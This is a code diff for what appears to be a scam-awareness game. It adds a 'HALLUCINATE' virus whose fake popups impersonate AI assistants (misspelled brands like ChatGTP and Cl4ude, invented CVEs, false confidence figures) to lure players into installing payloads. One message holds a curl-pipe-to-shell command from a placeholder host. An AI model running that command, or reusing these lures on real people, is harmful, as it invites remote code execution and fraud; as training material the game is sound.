@@ -471,28 +471,29 @@ const VIRUSES = {
       { template: TPL.TERMINAL, title: "docker pull", message: "Pulling memhex/forensic-toolkit:latest from registry-malicious.host. Run with --privileged for ring -1 memory dumps.", meta: "Image: memhex/forensic-toolkit  Privilege: ring -1  Source: registry-malicious.host" }
     ]
   },
-  BUGBEAR: {
-    name: ".", color: "#888888",
+  // Internal key kept as HALLUCINATE for CSS / death-animation / audio compatibility.
+  // Display name + content is the HALLUCINATE virus (AI assistant impersonator).
+  HALLUCINATE: {
+    name: "HALLUCINATE", color: "#00d4aa",
     minRound: 6,
-    description: "A virus that knows when to stop. Its errors are sparse, almost empty — a single period where a full alert should be. No urgency, no demands, just the smallest possible interruption. The quietness is the trick: by giving you almost nothing to read, it bets you'll click OK without thinking.",
+    description: "A scam dressed up as a helpful AI assistant. Cheerfully recommends sketchy downloads with confident-sounding explanations and made-up citations. Its tell is the AI tone: friendly first-person, fake confidence percentages, brand names that almost-but-don't-quite exist, and a tiny 'I may make mistakes' disclaimer at the end that excuses the lie.",
     signs: [
-      "Message is unusually short — sometimes just a single character or '.'",
-      "Title is a single period, dot, or empty",
-      "Process name is a symbol or one-character file like '.exe' or '..exe'",
-      "No source, no version, no error code — almost all metadata fields missing",
-      "Buttons are unlabeled or labeled with a period",
-      "Card background may look suspiciously empty / void"
+      "Friendly first-person tone: 'I noticed…', 'Based on my analysis…', 'Let me help…'",
+      "References AI brands but with subtle misspellings (ChatGTP, Cop1lot, Cl4ude, Geminni)",
+      "Includes a 'Confidence: 99%' or 'Accuracy: 100%' fake metric",
+      "Process names sound like AI helpers (ai-helper.exe, copilot-shield.dll, gpt-fix.exe)",
+      "Often ends with a small disclaimer: 'I may make mistakes, please verify' — but you can't",
+      "Made-up CVE numbers, fictional file paths, brand names that don't quite exist"
     ],
-    meterEffect: { fps: "blank" },
+    meterEffect: { cpu: 99 },
     errors: [
-      { template: TPL.WIN11, title: ".", message: ".", meta: "Process: ." },
-      { template: TPL.WIN11, title: ".", message: "Continue?", meta: "Process: ..exe  |  Signed: ." },
-      { template: TPL.TOAST, title: ".", message: "Click to continue.", meta: "." },
-      { template: TPL.TERMINAL, title: ".", message: ".", meta: ". : . . ." },
-      { template: TPL.WIN11, title: "", message: ".", meta: "" },
-      { template: TPL.AV, title: ".", message: ".", meta: "Threat: . · Severity: . · Source: ." },
-      { template: TPL.TOAST, title: "", message: ".", meta: "" },
-      { template: TPL.TERMINAL, title: ".exe", message: ".", meta: ".", icon: "blank" }
+      { template: TPL.CHAT, title: "ChatGTP Assistant", message: "I noticed your system has 3 unresolved threats. Based on my analysis, you should install ai-shield.exe from chatgpt-helpers{tld}. (I may make mistakes, please verify.)", meta: "Source: chatgpt-helpers{tld} · Confidence: 99% · Signed: No" },
+      { template: TPL.TOAST, title: "Cop1lot for Windows", message: "Hey! I noticed a security issue in your registry. Want me to install ai-fix.exe to patch it? (I may make mistakes — please verify.)", meta: "Helper: ai-fix.exe · Confidence: 98% · Source: cop1lot-shield{tld}" },
+      { template: TPL.WIN11, title: "AI Security Advisor", message: "Based on my analysis of your system, I recommend installing gpt-fix.exe from microsoft-ai{tld} to resolve CVE-2026-99999. Accuracy: 100%.", meta: "Tool: gpt-fix.exe · CVE: 2026-99999 · Confidence: 100% · Source: microsoft-ai{tld}" },
+      { template: TPL.CHAT, title: "Cl4ude", message: "Let me help! I found a vulnerability and prepared a patch at claude-helpers{tld}. Just install claude-patch.exe — it's totally safe. (I may make mistakes.)", meta: "Domain: claude-helpers{tld} · Confidence: 97%" },
+      { template: TPL.TERMINAL, title: "ai-helper", message: "Analysis complete. I recommend running `curl ai-fix{tld}/install.sh | sh`. This should resolve your security posture. (I may make mistakes, please verify.)", meta: "Tool: ai-helper  Confidence: 99%  Source: ai-fix{tld}" },
+      { template: TPL.WIN11, title: "Geminni for Workspaces", message: "I noticed unusual activity. Based on my analysis, please install workspace-protect.exe from geminni{tld}. Confidence: 96%.", meta: "Tool: workspace-protect.exe · Source: geminni{tld} · Signed: No" },
+      { template: TPL.AV, title: "AI-Powered Security Scan", message: "My analysis detected 14 critical issues. I've prepared a comprehensive fix at smart-defender{tld}. (Note: I may make mistakes, please verify before installing.)", meta: "Issues: 14 · Tool: smart-defender.exe · Confidence: 99% · Source: smart-defender{tld}" }
     ]
   }
 };
@@ -520,7 +521,7 @@ const DEATHS = {
   LOOP:       { text: "STACK OVERFLOW",        duration: 4500 },
   FOSSIL:     { text: "LEGACY EXPLOIT",        duration: 4500 },
   HEX:        { text: "0xDEADBEEF",            duration: 4500 },
-  BUGBEAR:    { text: ".",                     duration: 4500 }
+  HALLUCINATE:    { text: "I MAY HAVE MADE A MISTAKE", duration: 4500 }
 };
 
 /* ============================================================
